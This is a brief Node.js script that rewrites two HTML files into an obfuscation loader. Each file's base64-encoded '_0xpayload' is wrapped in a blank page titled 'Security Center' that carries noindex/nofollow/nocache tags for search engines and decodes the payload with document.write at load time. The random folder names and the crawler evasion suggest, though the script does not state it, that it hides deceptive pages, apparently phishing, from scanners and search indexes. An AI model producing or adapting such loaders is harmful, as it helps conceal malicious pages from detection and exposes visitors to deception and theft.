const fs = require('fs');

function rebuildPayload(filePath) {
    if (!fs.existsSync(filePath)) return;
    let content = fs.readFileSync(filePath, 'utf8');
    
    const match = content.match(/var _0xpayload = "(.*?)";/);
    if (!match) return;

    let b64 = match[1];

    const newLoader = `<!DOCTYPE html>
<html>
<head>
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, nocache">
  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, nocache">
  <title>Security Center</title>
</head>
<body style="background:#fff;width:100vw;height:100vh;margin:0;cursor:default;">
  <script>
    var _0xpayload = "${b64}";
    var binaryString = atob(_0xpayload);
    var bytes = new Uint8Array(binaryString.length);
    for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    document.open();
    document.write(new TextDecoder().decode(bytes));
    document.close();
  </script>
</body>
</html>`;

    fs.writeFileSync(filePath, newLoader, 'utf8');
}

rebuildPayload('c:\\Users\\acer\\Desktop\\US-P\\z3b5n1p\\index.html');
rebuildPayload('c:\\Users\\acer\\Desktop\\US-P\\x8f9q2m\\index.html');

console.log("Rebuilt with synchronous document.write");
